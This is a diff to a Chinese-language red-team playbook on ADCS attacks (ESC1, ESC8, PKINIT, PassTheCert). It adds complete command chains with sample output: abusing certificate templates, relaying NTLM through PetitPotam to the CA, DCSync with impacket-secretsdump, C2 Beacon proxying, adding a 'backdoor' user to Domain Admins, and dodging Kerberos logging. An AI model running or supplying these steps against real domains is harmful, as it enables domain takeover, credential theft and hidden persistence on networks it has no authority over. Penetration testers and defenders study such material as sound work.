@@ -7,21 +7,78 @@
 - 低权限用户有 Enroll 权限
 - 模板启用了 Client Authentication EKU
 
+### ESC1 完整利用步骤
+
+#### 第一步: 发现易受攻击的模板
+
 ```bash
 # Certipy 枚举（自动标注 ESC1）
-certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable
+certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout
 
-# 利用：申请域管证书
+# 输出中关注:
+#   Template Name: VulnerableTemplate
+#   [!] Vulnerabilities
+#     ESC1: 'DOMAIN\\Domain Users' can enroll, enrollee supplies subject and target has Client Authentication EKU
+#   ...
+#   Enrollee Supplies Subject: True
+#   Client Authentication: True
+#   Enrollment Rights: DOMAIN\Domain Users
+```
+
+```powershell
+# Windows: Certify 枚举
+Certify.exe find /vulnerable
+
+# 输出中关注:
+#   msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
+#   pkiextendedkeyusage: Client Authentication
+#   Enrollment Rights: DOMAIN\Domain Users
+```
+
+#### 第二步: 申请高权限证书（指定目标 UPN）
+
+```bash
+# 以当前低权限用户身份申请域管证书
 certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
-  -ca CA-NAME -template TEMPLATE_NAME \
+  -ca CA-NAME -template VulnerableTemplate \
   -upn administrator@DOMAIN
 
-# 认证
-certipy auth -pfx administrator.pfx -dc-ip DC_IP
-# 输出 NTLM Hash
+# 输出:
+# [*] Requesting certificate via RPC
+# [*] Successfully requested certificate
+# [*] Request ID is 23
+# [*] Got certificate with UPN 'administrator@DOMAIN'
+# [*] Certificate has no object SID
+# [*] Saved certificate and private key to 'administrator.pfx'
+```
 
-# DCSync
-impacket-secretsdump -hashes :NTLM_HASH DOMAIN/administrator@DC_IP
+#### 第三步: 使用证书认证获取 TGT 和 NTLM Hash
+
+```bash
+# PKINIT 认证
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+
+# 输出:
+# [*] Using principal: administrator@DOMAIN
+# [*] Trying to get TGT...
+# [*] Got TGT
+# [*] Saved credential cache to 'administrator.ccache'
+# [*] Trying to retrieve NT hash for 'administrator'
+# [*] Got hash for 'administrator@DOMAIN': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
+```
+
+#### 第四步: 利用获取的凭据
+
+```bash
+# 方法 A: 使用 NTLM Hash DCSync
+impacket-secretsdump -hashes :2b576acbe6bcfda7294d6bd18041b8fe DOMAIN/administrator@DC_IP
+
+# 方法 B: 使用 Kerberos 票据
+export KRB5CCNAME=administrator.ccache
+impacket-secretsdump -k -no-pass DOMAIN/administrator@DC_FQDN
+
+# 方法 C: 使用 NTLM Hash 横向移动
+netexec smb DC_IP -u administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
 ```
 
 ## ESC2: Any Purpose / SubCA 模板
@@ -125,33 +182,102 @@ certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
 
 ## ESC8: NTLM Relay 到 ADCS Web Enrollment
 
-这是实战中最常用的 ADCS 攻击路径。
+这是实战中最常用的 ADCS 攻击路径。PetitPotam 强制域控 NTLM 认证 + ntlmrelayx 中继到 ADCS 获取域控证书。
+
+### 前提确认
 
 ```bash
-# 1. 确认 ADCS Web Enrollment
+# 确认 ADCS Web Enrollment 存在
 curl -sk https://CA_SERVER/certsrv/
-# 或
-curl -sk http://CA_SERVER/certsrv/
+# 返回 401 或登录页面 → Web Enrollment 存在
 
-# 2. 启动中继
+curl -sk http://CA_SERVER/certsrv/
+# HTTP 也可达 → 无 HTTPS 强制 → 更容易中继
+```
+
+### 完整命令链（3 个终端）
+
+**终端 1: 启动 ntlmrelayx 中继**
+
+```bash
+# 基础用法
 ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
   -smb2support --adcs --template DomainController
 
-# 3. 触发域控认证（选一种）
-# PetitPotam
+# HTTPS 目标（需要忽略证书验证）
+ntlmrelayx.py -t https://CA_SERVER/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController
+
+# 指定监听接口
+ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController \
+  -ip ATTACKER_IP
+```
+
+**终端 2: 触发域控 NTLM 认证（PetitPotam）**
+
+```bash
+# PetitPotam 未认证版本（旧版 Windows 可用）
 python3 PetitPotam.py ATTACKER_IP DC_IP
-# PrinterBug
+
+# PetitPotam 认证版本（推荐，兼容性更好）
+python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
+
+# 备选: PrinterBug (MS-RPRN)
 python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
 
-# 4. 获取证书（ntlmrelayx 输出 Base64）
-echo "MIIRd..." | base64 -d > dc.pfx
+# 备选: DFSCoerce (MS-DFSNM)
+python3 dfscoerce.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
+```
 
-# 5. 认证
+**终端 1 输出（中继成功）**
+
+```
+[*] SMBD-Thread-X: Received connection from DC_IP
+[*] Authenticating against http://CA_SERVER as DOMAIN/DC_HOSTNAME$ SUCCEED
+[*] SMBD-Thread-X: Connection from DC_IP controlled, attacking target http://CA_SERVER
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE! ID XX
+[*] Base64 encoded certificate written to: DC_HOSTNAME$.b64
+```
+
+**终端 3: 使用获取的证书**
+
+```bash
+# 方法 A: 直接使用 Base64 证书 (PKINITtools)
+gettgtpkinit.py -pfx-base64 $(cat DC_HOSTNAME$.b64) \
+  'DOMAIN/DC_HOSTNAME$' dc.ccache
+
+export KRB5CCNAME=dc.ccache
+impacket-secretsdump -k -no-pass DOMAIN/'DC_HOSTNAME$'@DC_FQDN
+
+# 方法 B: 转为 PFX 后用 certipy
+echo "$(cat DC_HOSTNAME$.b64)" | base64 -d > dc.pfx
 certipy auth -pfx dc.pfx -dc-ip DC_IP
-# 获取域控机器账户 NTLM Hash
 
-# 6. DCSync
-impacket-secretsdump -hashes :HASH DOMAIN/DC_HOSTNAME$@DC_IP
+# 输出:
+# [*] Got hash for 'DC_HOSTNAME$@DOMAIN': aad3b435...:NTLM_HASH
+
+# DCSync
+impacket-secretsdump -hashes :NTLM_HASH DOMAIN/'DC_HOSTNAME$'@DC_IP
+```
+
+### 通过代理执行 ESC8
+
+```bash
+# 场景: 通过 C2 Beacon 的 SOCKS 代理执行
+# 1. 在 Beacon 上设置端口转发和流量重定向
+# beacon> rportfwd 8445 ATTACKER_IP 445
+# beacon> socks 1080
+
+# 2. 通过代理启动中继
+proxychains4 -q ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController
+
+# 3. 触发目标向 Beacon 机器认证
+# beacon> execute-assembly PetitPotam.exe BEACON_IP DC_IP
 ```
 
 ## ESC9: No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)
@@ -193,6 +319,167 @@ ntlmrelayx.py -t "rpc://CA_SERVER" -rpc-mode icpr \
 certipy forge -ca-pfx ca.pfx -upn administrator@DOMAIN -subject "CN=Administrator"
 certipy auth -pfx forged.pfx -dc-ip DC_IP
 ```
+
+---
+
+## PKINIT 认证流程详解
+
+### 概述
+
+PKINIT（Public Key Cryptography for Initial Authentication）是 Kerberos 的扩展，允许使用 X.509 证书代替密码进行预认证。完整流程: 证书 → TGT → NTLM Hash (UnPAC-the-hash)。
+
+### 认证流程
+
+```
+客户端持有证书 (PFX/PEM)
+     │
+     ▼
+AS-REQ (PA-PK-AS-REQ)
+  ├── 用证书私钥签名时间戳
+  └── 发送到 KDC (88/tcp)
+     │
+     ▼
+KDC 验证
+  ├── 证书链有效性（CA 是否在 NTAuth 中）
+  ├── 证书是否过期
+  ├── 证书是否被吊销（CRL 检查）
+  └── EKU 包含 Client Authentication
+     │
+     ▼
+AS-REP
+  ├── TGT（Ticket Granting Ticket）
+  └── PAC（Privilege Attribute Certificate）
+       └── 包含 NTLM Hash (encrypted)
+```
+
+### UnPAC-the-hash: 从 TGT 提取 NTLM Hash
+
+Certipy 在 PKINIT 认证时自动执行 UnPAC-the-hash，从 KDC 响应的 PAC 中提取用户的 NTLM Hash:
+
+```bash
+# certipy auth 一步完成: 证书 → TGT → NTLM Hash
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+
+# 输出:
+# [*] Using principal: administrator@DOMAIN
+# [*] Trying to get TGT...
+# [*] Got TGT
+# [*] Saved credential cache to 'administrator.ccache'  ← TGT
+# [*] Trying to retrieve NT hash for 'administrator'
+# [*] Got hash for 'administrator@DOMAIN': aad3b435...:HASH  ← NTLM Hash
+```
+
+### 使用 PKINITtools 分步执行
+
+```bash
+# 步骤 1: 证书 → TGT
+gettgtpkinit.py -cert-pfx administrator.pfx -dc-ip DC_IP \
+  "DOMAIN/administrator" admin.ccache
+
+# 步骤 2: TGT → NTLM Hash (UnPAC-the-hash)
+export KRB5CCNAME=admin.ccache
+getnthash.py -key AS_REP_KEY DOMAIN/administrator
+# AS_REP_KEY 从 gettgtpkinit 输出中获取
+
+# 步骤 3: 使用凭据
+# 用 TGT
+impacket-secretsdump -k -no-pass DOMAIN/administrator@DC_FQDN
+# 用 NTLM Hash
+impacket-secretsdump -hashes :NTLM_HASH DOMAIN/administrator@DC_IP
+```
+
+### Rubeus PKINIT (Windows)
+
+```powershell
+# 使用 PFX 文件获取 TGT
+Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:CERT_PASS /nowrap
+
+# 使用 Base64 编码证书
+Rubeus.exe asktgt /user:administrator /certificate:BASE64_CERT /password:CERT_PASS /ptt
+
+# 输出:
+# [*] Using PKINIT with etype rc4_hmac
+# [+] TGT request successful!
+# [*] base64(ticket.kirbi): doIFuj...
+```
+
+---
+
+## PassTheCert: 证书直接 LDAP 认证
+
+### 概述
+
+PassTheCert 使用证书通过 Schannel 直接对 DC 的 LDAPS 服务进行 TLS 客户端认证。完全绕过 Kerberos，不产生 Event 4768 日志。
+
+### 适用场景
+
+- DC 不支持 PKINIT（报错 `KDC_ERR_PADATA_TYPE_NOSUPP`）
+- 需要规避 Kerberos 认证日志
+- 需要直接操作 LDAP 对象
+
+### 从 PFX 提取证书和私钥
+
+```bash
+# certipy 提取
+certipy cert -pfx administrator.pfx -nokey -out user.crt
+certipy cert -pfx administrator.pfx -nocert -out user.key
+
+# openssl 提取
+openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out user.crt
+openssl pkcs12 -in administrator.pfx -nocerts -nodes -out user.key
+```
+
+### certipy LDAP Shell
+
+```bash
+certipy auth -pfx administrator.pfx -ldap-shell -dc-ip DC_IP
+
+# LDAP Shell 操作:
+add_user backdoor P@ssw0rd              # 创建用户
+add_user_to_group backdoor "Domain Admins"  # 加入 DA
+set_rbcd TARGET_HOST EVIL_HOST          # 配置 RBCD
+get_laps_password TARGET_HOST           # 读取 LAPS
+```
+
+### PassTheCert 工具
+
+```bash
+# LDAP Shell
+python3 passthecert.py -action ldap-shell \
+  -crt user.crt -key user.key \
+  -domain DOMAIN -dc-ip DC_IP
+
+# 添加机器账户
+python3 passthecert.py -action add-computer \
+  -crt user.crt -key user.key \
+  -domain DOMAIN -dc-ip DC_IP \
+  -computer-name 'EVIL$' -computer-pass 'P@ssw0rd'
+
+# 配置 RBCD（基于资源的约束委派）
+python3 passthecert.py -action write-rbcd \
+  -crt user.crt -key user.key \
+  -domain DOMAIN -dc-ip DC_IP \
+  -delegate-to TARGET_HOST -delegate-from 'EVIL$'
+
+# 修改用户密码
+python3 passthecert.py -action modify-user \
+  -crt user.crt -key user.key \
+  -domain DOMAIN -dc-ip DC_IP \
+  -target TARGET_USER -new-pass 'NewP@ssw0rd'
+```
+
+### PKINIT vs PassTheCert 对比
+
+| 特性 | PKINIT | PassTheCert (Schannel) |
+|------|--------|----------------------|
+| 协议 | Kerberos (88/tcp) | LDAPS (636/tcp) |
+| 产出 | TGT + NTLM Hash | LDAP Shell / 直接操作 |
+| 日志 | Event 4768 | LDAP 审计日志（通常不启用） |
+| DC 兼容性 | 需要 PKINIT 支持 | 所有支持 LDAPS 的 DC |
+| 横向移动 | 可用 TGT 访问任意服务 | 仅限 LDAP 操作 |
+| 隐蔽性 | 中 | 高 |
+
+---
 
 ## 故障排查
 
